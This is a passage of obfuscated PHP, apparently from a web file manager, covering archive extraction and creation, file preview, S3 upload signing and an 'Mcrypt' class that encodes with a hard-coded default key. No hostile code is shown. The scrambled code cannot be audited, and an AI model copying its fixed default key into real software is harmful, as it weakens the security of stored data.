$FÓÕÆ©É£ù[$bø™çğšÅ][$B¥‹Ô¤´ø¾[1941]] = iconv_to($FÓÕÆ©É£ù[$bø™çğšÅ][$B¥‹Ô¤´ø¾[1941]], $a‘öª·çÉá, $B¥‹Ô¤´ø¾[326]); unset($FÓÕÆ©É£ù[$bø™çğšÅ][$B¥‹Ô¤´ø¾[1944]]); } } return array($B¥‹Ô¤´ø¾[1051] => !0, $B¥‹Ô¤´ø¾[1053] => $FÓÕÆ©É£ù); } else { return array($B¥‹Ô¤´ø¾[1051] => !1, $B¥‹Ô¤´ø¾[1053] => $FÓÕÆ©É£ù); } } static function extract($a ÷Ú™‚å¦, $C¦˜ÑŠï×£, $D¶µÉÓŞ¸ = "\55\61", &$dÁ°™¼ÁÔ = false) { goto cˆŠÙî»ÒÕ; cˆŠÙî»ÒÕ: $d©Ì†ªÇ»Â =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $e™¨°¢»÷ = !empty($GLOBALS[$d©Ì†ªÇ»Â[1068]]) ? $GLOBALS[$d©Ì†ªÇ»Â[1068]] : get_path_ext($a ÷Ú™‚å¦); goto fáˆ’¾âÕÖ; fáˆ’¾âÕÖ: $aÄŞ×Ç½Ÿâ = self::listContent($a ÷Ú™‚å¦, !1); if (!$aÄŞ×Ç½Ÿâ[$d©Ì†ªÇ»Â[1051]]) { return $aÄŞ×Ç½Ÿâ; } if ($D¶µÉÓŞ¸ != $d©Ì†ªÇ»Â[1050]) { goto c™ä»‘„Îõ; c™ä»‘„Îõ: $B’ç½èè£¶ = self::fileIndex($aÄŞ×Ç½Ÿâ[$d©Ì†ªÇ»Â[1053]], $D¶µÉÓŞ¸); $dÁ°™¼ÁÔ = str_replace(array($d©Ì†ªÇ»Â[1091], $d©Ì†ªÇ»Â[1943]), $d©Ì†ªÇ»Â[70], $B’ç½èè£¶[$d©Ì†ªÇ»Â[1941]]); $cĞ˜«óİÆ = $dÁ°™¼ÁÔ; goto D…ó„Èä´œ; D…ó„Èä´œ: if ($GLOBALS[$d©Ì†ªÇ»Â[6]][$d©Ì†ªÇ»Â[1172]] != $d©Ì†ªÇ»Â[326]) { $cĞ˜«óİÆ = unzip_pre_name($dÁ°™¼ÁÔ); } $BšŒ¾²ãŸ = get_path_father($dÁ°™¼ÁÔ); if ($BšŒ¾²ãŸ == $dÁ°™¼ÁÔ) { $BšŒ¾²ãŸ = $d©Ì†ªÇ»Â[33]; } goto C¹ëˆòàêê; C¹ëˆòàêê: if ($B’ç½èè£¶[$d©Ì†ªÇ»Â[76]]) { $cĞ˜«óİÆ = rtrim($cĞ˜«óİÆ, $d©Ì†ªÇ»Â[8]) . $d©Ì†ªÇ»Â[8]; $dÁ°™¼ÁÔ = array($dÁ°™¼ÁÔ); } $EĞª‚¦½õî = str_replace($d©Ì†ªÇ»Â[93], $d©Ì†ªÇ»Â[8], $cĞ˜«óİÆ); if (substr($EĞª‚¦½õî, -1) == $d©Ì†ªÇ»Â[8]) { if (!strstr(trim($EĞª‚¦½õî, $d©Ì†ªÇ»Â[8]), $d©Ì†ªÇ»Â[8])) { $C¦˜ÑŠï×£ = $C¦˜ÑŠï×£ . get_path_this($EĞª‚¦½õî) . $d©Ì†ªÇ»Â[8]; } } else { if ($BšŒ¾²ãŸ == $cĞ˜«óİÆ) { $BšŒ¾²ãŸ = $d©Ì†ªÇ»Â[33]; } } goto e†‹ œ©¿; e†‹ œ©¿: } goto d÷ìÚñÌš; d÷ìÚñÌš: if (self::checkIfType($e™¨°¢»÷, $d©Ì†ªÇ»Â[1923])) { if ($D¶µÉÓŞ¸ != $d©Ì†ªÇ»Â[1050]) { $cĞ˜«óİÆ = unzip_pre_name($cĞ˜«óİÆ); $BšŒ¾²ãŸ = unzip_pre_name($BšŒ¾²ãŸ); $aìØç›†À” = PclTarExtractList($a ÷Ú™‚å¦, array($cĞ˜«óİÆ), $C¦˜ÑŠï×£, $BšŒ¾²ãŸ, $e™¨°¢»÷); } else { $aìØç›†À” = PclTarExtract($a ÷Ú™‚å¦, $C¦˜ÑŠï×£, $d©Ì†ªÇ»Â[361], $e™¨°¢»÷); } return array($d©Ì†ªÇ»Â[1051] => $aìØç›†À”, $d©Ì†ªÇ»Â[1053] => PclErrorString(!0)); } else { if (self::checkIfType($e™¨°¢»÷, $d©Ì†ªÇ»Â[1064])) { return kodRarArchive::extract($a ÷Ú™‚å¦, $C¦˜ÑŠï×£, $e™¨°¢»÷, $dÁ°™¼ÁÔ); } else { if (kodZipArchive::support($d©Ì†ªÇ»Â[1945])) { return kodZipArchive::extract($a ÷Ú™‚å¦, $C¦˜ÑŠï×£, $dÁ°™¼ÁÔ); } else { $eºè­ŞâĞ´ = new PclZip($a ÷Ú™‚å¦); if ($D¶µÉÓŞ¸ != $d©Ì†ªÇ»Â[1050]) { $aìØç›†À” = $eºè­ŞâĞ´->extract(PCLZIP_OPT_PATH, $C¦˜ÑŠï×£, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d©Ì†ªÇ»Â[1946], PCLZIP_OPT_BY_NAME, $B’ç½èè£¶[$d©Ì†ªÇ»Â[1941]], PCLZIP_OPT_REMOVE_PATH, $BšŒ¾²ãŸ, PCLZIP_OPT_REPLACE_NEWER); } else { $aìØç›†À” = $eºè­ŞâĞ´->extract(PCLZIP_OPT_PATH, $C¦˜ÑŠï×£, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d©Ì†ªÇ»Â[1946], PCLZIP_OPT_REPLACE_NEWER); } return array($d©Ì†ªÇ»Â[1051] => $aìØç›†À”, $d©Ì†ªÇ»Â[1053] => $eºè­ŞâĞ´->errorName(!0)); } } } return array($d©Ì†ªÇ»Â[1051] => !1, $d©Ì†ªÇ»Â[1053] => $d©Ì†ªÇ»Â[1947]); goto fÊ‡´Œ™İ; fÊ‡´Œ™İ: } static function fileIndex($D¬Ø»º«‰½, $A¬â†÷½½Ü, $c„ñğšª‚æ = false) { goto A—õî×Âßœ; c­âÅùôÅµ: $B¢ñ—»×åô = $DÈÔÂ©°½Ö; if ($c„ñğšª‚æ) { $B¢ñ—»×åô = $DÈÔÂ©°½Ö[$c„ñğšª‚æ]; if ($DÈÔÂ©°½Ö[$c™Ì¹íÇÍ[76]]) { $B¢ñ—»×åô = rtrim($B¢ñ—»×åô, $c™Ì¹íÇÍ[8]) . $c™Ì¹íÇÍ[8]; } } return $B¢ñ—»×åô; goto f¼³“Íæ–¦; FÓ‘×Ä¿”Å: $FĞˆˆ´åÍÛ = count($D¬Ø»º«‰½); for ($aÒÒÑÜî›£ = 0; $aÒÒÑÜî›£ < $FĞˆˆ´åÍÛ; $aÒÒÑÜî›£++) { if ($A¬â†÷½½Ü == $D¬Ø»º«‰½[$aÒÒÑÜî›£][$c™Ì¹íÇÍ[1055]]) { $DÈÔÂ©°½Ö = $D¬Ø»º«‰½[$aÒÒÑÜî›£]; break; } } if (!$DÈÔÂ©°½Ö) { show_tips($c™Ì¹íÇÍ[1948]); } goto c­âÅùôÅµ; A—õî×Âßœ: $c™Ì¹íÇÍ =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); if (!is_array($D¬Ø»º«‰½)) { return !1; } goto FÓ‘×Ä¿”Å; f¼³“Íæ–¦: } static function extractZipFile($Fæö¹£ƒæ, $eóˆ¾ğÚÄÉ, $bî¬ŠÍ¢ùö = false) { goto d“œ£²—Ù; CÆïµ„îõ: $B±Ê˜“êğñ = get_path_father($eóˆ¾ğÚÄÉ); if ($B±Ê˜“êğñ == $eóˆ¾ğÚÄÉ) { $B±Ê˜“êğñ = $eµ’†Éˆøø[33]; } $DõÄ å£ª = $f†œºÒƒª->extract(PCLZIP_OPT_PATH, $CÑéïÅËäë, PCLZIP_CB_PRE_FILE_NAME, $eµ’†Éˆøø[1946], PCLZIP_OPT_REMOVE_PATH, $B±Ê˜“êğñ, PCLZIP_OPT_BY_NAME, $eóˆ¾ğÚÄÉ); goto eÆ¡©”İÛó; d“œ£²—Ù: $eµ’†Éˆøø =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $CÑéïÅËäë = TEMP_FILES . hash_path($Fæö¹£ƒæ) . $eµ’†Éˆøø[8]; goto A• æùå; eÆ¡©”İÛó: if (!file_exists($Céİ¼ÂÜ¿ )) { return !1; } @rename($Céİ¼ÂÜ¿ , $e¥×’‚Õƒ); return $e¥×’‚Õƒ; goto Cè²äÕ³ëÈ; B”·Ï©Î”¢: if (file_exists($e¥×’‚Õƒ)) { return $e¥×’‚Õƒ; } $f†œºÒƒª = new PclZip($Fæö¹£ƒæ); $Céİ¼ÂÜ¿  = unzip_filter_ext($CÑéïÅËäë . get_path_this($eóˆ¾ğÚÄÉ)); goto CÆïµ„îõ; A• æùå: mk_dir($CÑéïÅËäë); $e¥×’‚Õƒ = $CÑéïÅËäë . md5($Fæö¹£ƒæ . $eóˆ¾ğÚÄÉ); if ($bî¬ŠÍ¢ùö) { $e¥×’‚Õƒ = $CÑéïÅËäë . $bî¬ŠÍ¢ùö; } goto B”·Ï©Î”¢; Cè²äÕ³ëÈ: } static function filePreview($aìàÇÒí, $c·‚¥Ï×, $A±ó¾´µ¦ç = false, $AæñãòÒß = false) { goto f×ùÔÎ„ÕŠ; aœŠĞöÍ£‡: if (!file_exists($Eƒ¶ˆ½ÍÑØ)) { del_dir($C‰ô‡Æã¶Ó); show_json($bƒ‘¸–—§‚[1951]); } IO::fileOut($Eƒ¶ˆ½ÍÑØ, $A±ó¾´µ¦ç, $F… ÷Û¬®ã); goto DŠî¯Ö‹éæ; Dóáæ‰†î¦: if (!$Dæê¤Á³Û[$bƒ‘¸–—§‚[1051]]) { show_json($Dæê¤Á³Û[$bƒ‘¸–—§‚[1053]], !1); } if (!file_exists($Bõ¿¸¨Ç)) { show_json($bƒ‘¸–—§‚[1950], !1); } @rename($Bõ¿¸¨Ç, $Eƒ¶ˆ½ÍÑØ); goto aœŠĞöÍ£‡; f×ùÔÎ„ÕŠ: $bƒ‘¸–—§‚ =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $C‰ô‡Æã¶Ó = TEMP_FILES . hash_path($aìàÇÒí) . $bƒ‘¸–—§‚[8]; goto döºò÷ğÄ±; e ôÚ·Í­Ñ: $a¹ŠÔ™Ö£© = unzip_pre_name($a¹ŠÔ™Ö£©); $F… ÷Û¬®ã = get_path_this($a¹ŠÔ™Ö£©); $Bõ¿¸¨Ç = unzip_filter_ext($C‰ô‡Æã¶Ó . $F… ÷Û¬®ã); goto Dóáæ‰†î¦; Eø®Õ§Óù›: $Dæê¤Á³Û = self::extract($aìàÇÒí, $C‰ô‡Æã¶Ó, $c·‚¥Ï×, $a¹ŠÔ™Ö£©); if (is_array($a¹ŠÔ™Ö£©)) { show_json($bƒ‘¸–—§‚[1949], !1); } if (file_exists($Eƒ¶ˆ½ÍÑØ)) { IO::fileOut($Eƒ¶ˆ½ÍÑØ, $A±ó¾´µ¦ç, get_path_this($a¹ŠÔ™Ö£©)); return; } goto e ôÚ·Í­Ñ; döºò÷ğÄ±: mk_dir($C‰ô‡Æã¶Ó); $Eƒ¶ˆ½ÍÑØ = $C‰ô‡Æã¶Ó . md5($aìàÇÒí . $c·‚¥Ï× . $AæñãòÒß); $a¹ŠÔ™Ö£© = $bƒ‘¸–—§‚[33]; goto Eø®Õ§Óù›; DŠî¯Ö‹éæ: } static function create($d½Î–Ä¼´, $FÏÍô›±œ®) { $D†¾ƒÃĞ…  =& $_SERVER[ã®Â„Éæ¹¤]; self::init(); $cåñİ˜Å® = get_path_ext($d½Î–Ä¼´); $bÌóßÇÂ = !1; if (self::checkIfType($cåñİ˜Å®, $D†¾ƒÃĞ… [301])) { if (kodZipArchive::support($D†¾ƒÃĞ… [1030])) { return kodZipArchive::create($d½Î–Ä¼´, $FÏÍô›±œ®); } $bòÂùò… = new PclZip($d½Î–Ä¼´); foreach ($FÏÍô›±œ® as $Aó¤†ÀïË => $eÛÖÇÙ®) { $eÛÖÇÙ® = str_replace($D†¾ƒÃĞ… [469], $D†¾ƒÃĞ… [8], $eÛÖÇÙ®); $A˜äÇñ¿ÖÄ = Kodio::clear(get_path_father($eÛÖÇÙ®)); if ($Aó¤†ÀïË == 0) { $bÌóßÇÂ = $bòÂùò…->create($eÛÖÇÙ®, PCLZIP_OPT_REMOVE_PATH, $A˜äÇñ¿ÖÄ, PCLZIP_CB_PRE_FILE_NAME, $D†¾ƒÃĞ… [1952]); continue; } $bÌóßÇÂ = $bòÂùò…->add($eÛÖÇÙ®, PCLZIP_OPT_REMOVE_PATH, $A˜äÇñ¿ÖÄ, PCLZIP_CB_PRE_FILE_NAME, $D†¾ƒÃĞ… [1952]); } } else { if (self::checkIfType($cåñİ˜Å®, $D†¾ƒÃĞ… [1923])) { foreach ($FÏÍô›±œ® as $Aó¤†ÀïË => $eÛÖÇÙ®) { $eÛÖÇÙ® = str_replace($D†¾ƒÃĞ… [469], $D†¾ƒÃĞ… [8], $eÛÖÇÙ®); $A˜äÇñ¿ÖÄ = Kodio::clear(get_path_father($eÛÖÇÙ®)); if ($Aó¤†ÀïË == 0) { $bÌóßÇÂ = PclTarCreate($d½Î–Ä¼´, array($eÛÖÇÙ®), $cåñİ˜Å®, null, $A˜äÇñ¿ÖÄ); continue; } $bÌóßÇÂ = PclTarAddList($d½Î–Ä¼´, array($eÛÖÇÙ®), $D†¾ƒÃĞ… [33], $A˜äÇñ¿ÖÄ, $cåñİ˜Å®); } } } return $bÌóßÇÂ; } } class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\153\101\72\x64\x6c\155\143\154\x64\105\166\x2c\x65"; public static function encode($bß¼¼‰Ô£õ, $Fñìö×¹å“ = '', $A’Ö¢¨×£ = 0, $dÔ¼æÚÈğ… = '') { goto d·ºïÇŸóŸ; dÉœ™Í¾á: for ($CÃŒ­Ğ¯İ© = 0; $CÃŒ­Ğ¯İ© <= 255; $CÃŒ­Ğ¯İ©++) { $D‚ŠÚôƒÓ[$CÃŒ­Ğ¯İ©] = ord($Eóùä‰Òï[$CÃŒ­Ğ¯İ© % $A»ºô÷ìé]); } $cÕ§©Ğ„µÊ = range(0, 255); for ($eòõêÄÉ¾® = $CÃŒ­Ğ¯İ© = 0; $CÃŒ­Ğ¯İ© < 256; $CÃŒ­Ğ¯İ©++) { $eòõêÄÉ¾® = ($eòõêÄÉ¾® + $cÕ§©Ğ„µÊ[$CÃŒ­Ğ¯İ©] + $D‚ŠÚôƒÓ[$CÃŒ­Ğ¯İ©]) % 256; $Fí„ùô“Ò = $cÕ§©Ğ„µÊ[$CÃŒ­Ğ¯İ©]; $cÕ§©Ğ„µÊ[$CÃŒ­Ğ¯İ©] = $cÕ§©Ğ„µÊ[$eòõêÄÉ¾®]; $cÕ§©Ğ„µÊ[$eòõêÄÉ¾®] = $Fí„ùô“Ò; } goto Dçö‹Ã‚—œ; Ağ®ù³Òñ: $b ğšÛÙº« = str_replace(array($dãÚ‰½’øµ[284], $dãÚ‰½’øµ[8], $dãÚ‰½’øµ[925]), array($dãÚ‰½’øµ[412], $dãÚ‰½’øµ[70], $dãÚ‰½’øµ[91]), $b ğšÛÙº«); return $b ğšÛÙº«; goto aİá¨å•‹; CƒÙÁ†á…¦: $a«›ËÖ†¡à = substr($dÔ¼æÚÈğ…, -$E‚ÕÛñÒñ); $Eóùä‰Òï = $a±á©ğ©‚† . md5($a±á©ğ©‚† . $a«›ËÖ†¡à); $A»ºô÷ìé = strlen($Eóùä‰Òï); goto dèàìÄö; Dçö‹Ã‚—œ: $b ğšÛÙº« = $dãÚ‰½’øµ[33]; for ($A‚ë†‚•§ = $eòõêÄÉ¾® = $CÃŒ­Ğ¯İ© = 0; $CÃŒ­Ğ¯İ© < $a«÷ô«ŞäÖ; $CÃŒ­Ğ¯İ©++) { $A‚ë†‚•§ = ($A‚ë†‚•§ + 1) % 256; $eòõêÄÉ¾® = ($eòõêÄÉ¾® + $cÕ§©Ğ„µÊ[$A‚ë†‚•§]) % 256; $Fí„ùô“Ò = $cÕ§©Ğ„µÊ[$A‚ë†‚•§]; $cÕ§©Ğ„µÊ[$A‚ë†‚•§] = $cÕ§©Ğ„µÊ[$eòõêÄÉ¾®]; $cÕ§©Ğ„µÊ[$eòõêÄÉ¾®] = $Fí„ùô“Ò; $b ğšÛÙº« .= chr(ord($bß¼¼‰Ô£õ[$CÃŒ­Ğ¯İ©]) ^ $cÕ§©Ğ„µÊ[($cÕ§©Ğ„µÊ[$A‚ë†‚•§] + $cÕ§©Ğ„µÊ[$eòõêÄÉ¾®]) % 256]); } $b ğšÛÙº« = $a«›ËÖ†¡à . str_replace($dãÚ‰½’øµ[925], $dãÚ‰½’øµ[33], base64_encode($b ğšÛÙº«)); goto Ağ®ù³Òñ; d·ºïÇŸóŸ: $dãÚ‰½’øµ =& $_SERVER[ã®Â„Éæ¹¤]; $E‚ÕÛñÒñ = 4; $Fñìö×¹å“ = md5($Fñìö×¹å“ ? $Fñìö×¹å“ : self::$defaultKey); goto fÆ¼ÁÊ‡ë¯; fÆ¼ÁÊ‡ë¯: $a±á©ğ©‚† = md5(substr($Fñìö×¹å“, 0, 16)); $FÀ“ÚÖ¤†¿ = md5(substr($Fñìö×¹å“, 16, 16)); $dÔ¼æÚÈğ… = $dÔ¼æÚÈğ… ? $dÔ¼æÚÈğ… : md5(microtime()); goto CƒÙÁ†á…¦; dèàìÄö: $bß¼¼‰Ô£õ = sprintf($dãÚ‰½’øµ[1953], $A’Ö¢¨×£ ? $A’Ö¢¨×£ + time() : 0) . substr(md5($bß¼¼‰Ô£õ . $FÀ“ÚÖ¤†¿), 0, 16) . $bß¼¼‰Ô£õ; $a«÷ô«ŞäÖ = strlen($bß¼¼‰Ô£õ); $D‚ŠÚôƒÓ = array(); goto dÉœ™Í¾á; aİá¨å•‹: } public static function decode($FÚ¨šš„‘Å, $Bä‘÷šÆˆ = '') { goto EºˆŸÑïµñ; B’–²óÜùô: for ($E½ï¡ºªğñ = 0; $E½ï¡ºªğñ <= 255; $E½ï¡ºªğñ++) { $bÍ…±¼¸§[$E½ï¡ºªğñ] = ord($c…—Ëğ”–´[$E½ï¡ºªğñ % $e˜ª Éš‹‘]); } $AÅš¶´­İÛ = range(0, 255); for ($b¦©Ùè¨Ó = $E½ï¡ºªğñ = 0; $E½ï¡ºªğñ < 256; $E½ï¡ºªğñ++) { $b¦©Ùè¨Ó = ($b¦©Ùè¨Ó + $AÅš¶´­İÛ[$E½ï¡ºªğñ] + $bÍ…±¼¸§[$E½ï¡ºªğñ]) % 256; $A¤ŒøÛ¢ô­ = $AÅš¶´­İÛ[$E½ï¡ºªğñ]; $AÅš¶´­İÛ[$E½ï¡ºªğñ] = $AÅš¶´­İÛ[$b¦©Ùè¨Ó]; $AÅš¶´­İÛ[$b¦©Ùè¨Ó] = $A¤ŒøÛ¢ô­; } goto C°Ù¯¸‚ôì; b²‹´ƒ®íÅ: $F­²Ú“–… = substr($FÚ¨šš„‘Å, 0, $B¸İÉã÷ŠÓ); $c…—Ëğ”–´ = $Aİ·ˆ‹ £ . md5($Aİ·ˆ‹ £ . $F­²Ú“–…); $e˜ª Éš‹‘ = strlen($c…—Ëğ”–´); goto Bïé„­µ¾Š; a×ñ†­øé˜: $Bä‘÷šÆˆ = md5($Bä‘÷šÆˆ ? $Bä‘÷šÆˆ : self::$defaultKey); $Aİ·ˆ‹ £ = md5(substr($Bä‘÷šÆˆ, 0, 16)); $B×œ¯»ÄæÊ = md5(substr($Bä‘÷šÆˆ, 16, 16)); goto b²‹´ƒ®íÅ; C°Ù¯¸‚ôì: $e–™“ÒÔ±– = $eÀä«Ş™Ï[33]; for ($Dç‘ËŞ˜Ä“ = $b¦©Ùè¨Ó = $E½ï¡ºªğñ = 0; $E½ï¡ºªğñ < $dçÅ‚°ªÜÕ; $E½ï¡ºªğñ++) { $Dç‘ËŞ˜Ä“ = ($Dç‘ËŞ˜Ä“ + 1) % 256; $b¦©Ùè¨Ó = ($b¦©Ùè¨Ó + $AÅš¶´­İÛ[$Dç‘ËŞ˜Ä“]) % 256; $A¤ŒøÛ¢ô­ = $AÅš¶´­İÛ[$Dç‘ËŞ˜Ä“]; $AÅš¶´­İÛ[$Dç‘ËŞ˜Ä“] = $AÅš¶´­İÛ[$b¦©Ùè¨Ó]; $AÅš¶´­İÛ[$b¦©Ùè¨Ó] = $A¤ŒøÛ¢ô­; $e–™“ÒÔ±– .= chr(ord($FÚ¨šš„‘Å[$E½ï¡ºªğñ]) ^ $AÅš¶´­İÛ[($AÅš¶´­İÛ[$Dç‘ËŞ˜Ä“] + $AÅš¶´­İÛ[$b¦©Ùè¨Ó]) % 256]); } $a†Ç¹‰ = intval(substr($e–™“ÒÔ±–, 0, 10)); goto D³…ğî¨Ô«; Bïé„­µ¾Š: $FÚ¨šš„‘Å = base64_decode(substr($FÚ¨šš„‘Å, $B¸İÉã÷ŠÓ)); $dçÅ‚°ªÜÕ = strlen($FÚ¨šš„‘Å); $bÍ…±¼¸§ = array(); goto B’–²óÜùô; EºˆŸÑïµñ: $eÀä«Ş™Ï =& $_SERVER[ã®Â„Éæ¹¤]; $FÚ¨šš„‘Å = str_replace(array($eÀä«Ş™Ï[412], $eÀä«Ş™Ï[70], $eÀä«Ş™Ï[91]), array($eÀä«Ş™Ï[284], $eÀä«Ş™Ï[8], $eÀä«Ş™Ï[925]), $FÚ¨šš„‘Å); $B¸İÉã÷ŠÓ = 4; goto a×ñ†­øé˜; D³…ğî¨Ô«: if (($a†Ç¹‰ == 0 || $a†Ç¹‰ - time() > 0) && substr($e–™“ÒÔ±–, 10, 16) == substr(md5(substr($e–™“ÒÔ±–, 26) . $B×œ¯»ÄæÊ), 0, 16)) { return substr($e–™“ÒÔ±–, 26); } else { return $eÀä«Ş™Ï[33]; } goto däÓ†ˆÃùº; däÓ†ˆÃùº: } } goto F”Ô¦µ•¦; Eè×²‡£ªß: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($d‹Ãï×›ó) { parent::__construct($d‹Ãï×›ó); } public function uploadFormData($DÕ¤³ùŸ¨Ó, $Fò­ó†ğ²Ç = 3600) { goto cˆ¯µƒÀ¨Š; D¡Í¢ŞÈÙ–: $AÅØ¸ƒÅ› = base64_encode(json_encode($Bê³ĞŞ²î)); $b„Å…¦™óÆ = hash_hmac($DÃÜÒÎÈ¨·[1163], $BÁÓÌùã†™, $DÃÜÒÎÈ¨·[1164] . $this->secret, !0); $c×î¤ÇÖ = hash_hmac($DÃÜÒÎÈ¨·[1163], $this->region, $b„Å…¦™óÆ, !0); goto BĞğøÒÁ±; bôèàÑƒé: $e²ô¢äİ¨ = array($DÃÜÒÎÈ¨·[199] => $DÃÜÒÎÈ¨·[33], $DÃÜÒÎÈ¨·[1165] => $DÃÜÒÎÈ¨·[33], $DÃÜÒÎÈ¨·[1123] => $e·Ñˆ·Üù, $DÃÜÒÎÈ¨·[1127] => $Báö”ìĞÜ¶, $DÃÜÒÎÈ¨·[1131] => $AÅØ¸ƒÅ›, $DÃÜÒÎÈ¨·[1166] => $d¨ï•Ş®É, $DÃÜÒÎÈ¨·[1167] => $c¶î¹›ôĞÌ, $DÃÜÒÎÈ¨·[1168] => $eêÜÌœ»à‰, $DÃÜÒÎÈ¨·[1169] => $F‹¨„¶”Ü, $DÃÜÒÎÈ¨·[1170] => $a¯½Ÿ®ˆÛâ, $DÃÜÒÎÈ¨·[169] => $this->getHost()); return $e²ô¢äİ¨; goto f˜ºÚÍÀİ; Dí°¤¬Ù™: $C¢¡¼¡¡ŸÉ = $DÃÜÒÎÈ¨·[59]; $eêÜÌœ»à‰ = gmdate($DÃÜÒÎÈ¨·[1154]); $BÁÓÌùã†™ = gmdate($DÃÜÒÎÈ¨·[712]); goto b—ÎÁœ¶†; BĞğøÒÁ±: $AÁõÁ‚×Š˜ = hash_hmac($DÃÜÒÎÈ¨·[1163], $C¢¡¼¡¡ŸÉ, $c×î¤ÇÖ, !0); $fùÓÍáÆÖë = hash_hmac($DÃÜÒÎÈ¨·[1163], $Cª®Üê¨•, $AÁõÁ‚×Š˜, !0); $a¯½Ÿ®ˆÛâ = hash_hmac($DÃÜÒÎÈ¨·[1163], $AÅØ¸ƒÅ›, $fùÓÍáÆÖë); goto bôèàÑƒé; f¤Ö§²ÒÂá: $E°ä¦Šé¯Œ = array($this->accessKey, $BÁÓÌùã†™, $this->region, $C¢¡¼¡¡ŸÉ, $Cª®Üê¨•); $d¨ï•Ş®É = implode($DÃÜÒÎÈ¨·[8], $E°ä¦Šé¯Œ); $Bê³ĞŞ²î = array($DÃÜÒÎÈ¨·[1121] => gmdate($DÃÜÒÎÈ¨·[1120], strtotime($DÃÜÒÎÈ¨·[1156])), $DÃÜÒÎÈ¨·[1122] => array(array($DÃÜÒÎÈ¨·[1124] => $this->bucket), array($DÃÜÒÎÈ¨·[1123] => $e·Ñˆ·Üù), array($DÃÜÒÎÈ¨·[1125], $DÃÜÒÎÈ¨·[1126], $DÃÜÒÎÈ¨·[33]), array($DÃÜÒÎÈ¨·[1125], $DÃÜÒÎÈ¨·[1157], $DÃÜÒÎÈ¨·[33]), array($DÃÜÒÎÈ¨·[1125], $DÃÜÒÎÈ¨·[1158], $DÃÜÒÎÈ¨·[33]), array($DÃÜÒÎÈ¨·[1127] => $Báö”ìĞÜ¶), array($DÃÜÒÎÈ¨·[1159] => $d¨ï•Ş®É), array($DÃÜÒÎÈ¨·[1160] => $c¶î¹›ôĞÌ), array($DÃÜÒÎÈ¨·[1161] => $eêÜÌœ»à‰), array($DÃÜÒÎÈ¨·[1162] => $F‹¨„¶”Ü))); goto D¡Í¢ŞÈÙ–; cˆ¯µƒÀ¨Š: $DÃÜÒÎÈ¨· =& $_SERVER[ã®Â„Éæ¹¤]; $e·Ñˆ·Üù = $DÃÜÒÎÈ¨·[185]; $c¶î¹›ôĞÌ = $DÃÜÒÎÈ¨·[1153]; goto Dí°¤¬Ù™; b—ÎÁœ¶†: $Cª®Üê¨• = $DÃÜÒÎÈ¨·[1155]; $F‹¨„¶”Ü = $Fò­ó†ğ²Ç . $DÃÜÒÎÈ¨·[33]; $Báö”ìĞÜ¶ = $DÃÜÒÎÈ¨·[1119]; goto f¤Ö§²ÒÂá; f˜ºÚÍÀİ: } public function multiUploadFormData($Cø‰ËÎ‹…Ï, $a‚°®ÌÔØ = 3600) { $d®¸íÎ±±ë =& $_SERVER[ã®Â„Éæ¹¤]; $f‘»ŠÆÉÂ = gmdate($d®¸íÎ±±ë[1248]); $AŞ¸°çµñê = array(); $DƒàçÍÕºœ = $this->client->getUploadId($this->bucket, $Cø‰ËÎ‹…Ï, $AŞ¸°çµñê); if (!$DƒàçÍÕºœ) { return !1; } return array($d®¸íÎ±±ë[209] => $DƒàçÍÕºœ, $d®¸íÎ±±ë[169] => $this->getHost() . $d®¸íÎ±±ë[8] . $this->pathEncode($Cø‰ËÎ‹…Ï), $d®¸íÎ±±ë[210] => $f‘»ŠÆÉÂ, $d®¸íÎ±±ë[89] => $Cø‰ËÎ‹…Ï); } public function multiUploadAuthData($BïÎ£†á×•, $e¦‹´„¸ØÅ = array()) { goto b®†Ã¯’¬½; C³ğêë¶çŞ: unset($e¦‹´„¸ØÅ[$E•¢®¾‰Í´[89]]); if (isset($e¦‹´„¸ØÅ[$E•¢®¾‰Í´[211]])) { return $this->listUploadParts($bğ¶ïñ² , $e¦‹´„¸ØÅ); } $eˆ‡à™£Û = array(); goto fŒ¾à£â¡ø; b®†Ã¯’¬½: $E•¢®¾‰Í´ =& $_SERVER[ã®Â„Éæ¹¤]; $a›ÅĞ ©Î = isset($e¦‹´„¸ØÅ[$E•¢®¾‰Í´[160]]) ? $e¦‹´„¸ØÅ[$E•¢®¾‰Í´[160]] : $E•¢®¾‰Í´[33]; $bğ¶ïñ²  = $e¦‹´„¸ØÅ[$E•¢®¾‰Í´[89]]; goto C³ğêë¶çŞ; BÅÇÅ»—: $eá¸Œ‘ÑÏ¿ = $E•¢®¾‰Í´[214]; $AÔ’²‡—‡” = $E•¢®¾‰Í´[8] . $this->pathEncode($bğ¶ïñ² ) . $a›ÅĞ ©Î; $Bèçù¶¸æ° = $this->client->__getSignatureV4($eˆ‡à™£Û, $cï¬‘«‰´, $eá¸Œ‘ÑÏ¿, $AÔ’²‡—‡”); goto CËŸÖ–îÛï; fŒ¾à£â¡ø: if (isset($e¦‹´„¸ØÅ[$E•¢®¾‰Í´[1249]])) { $eˆ‡à™£Û[$E•¢®¾‰Í´[1250]] = $e¦‹´„¸ØÅ[$E•¢®¾‰Í´[1249]]; } $E‰Àô¤ï­ã = explode($E•¢®¾‰Í´[171], $this->getHost()); $cï¬‘«‰´ = array($E•¢®¾‰Í´[1251] => $E‰Àô¤ï­ã[1], $E•¢®¾‰Í´[1252] => $E•¢®¾‰Í´[33], $E•¢®¾‰Í´[199] => $E•¢®¾‰Í´[116], $E•¢®¾‰Í´[1165] => $e¦‹´„¸ØÅ[$E•¢®¾‰Í´[77]]); goto BÅÇÅ»—; CËŸÖ–îÛï: if (strpos($a›ÅĞ ©Î, $E•¢®¾‰Í´[213]) === 0) { if (isset($eˆ‡à™£Û[$E•¢®¾‰Í´[1250]])) { $e³öå÷âÂ = $eˆ‡à™£Û[$E•¢®¾‰Í´[1250]]; } else { if (isset($Bèçù¶¸æ°[$E•¢®¾‰Í´[1250]])) { $e³öå÷âÂ = $Bèçù¶¸æ°[$E•¢®¾‰Í´[1250]]; } else { $e³öå÷âÂ = hash($E•¢®¾‰Í´[1163], $E•¢®¾‰Í´[33]); } } return array($E•¢®¾‰Í´[220] => 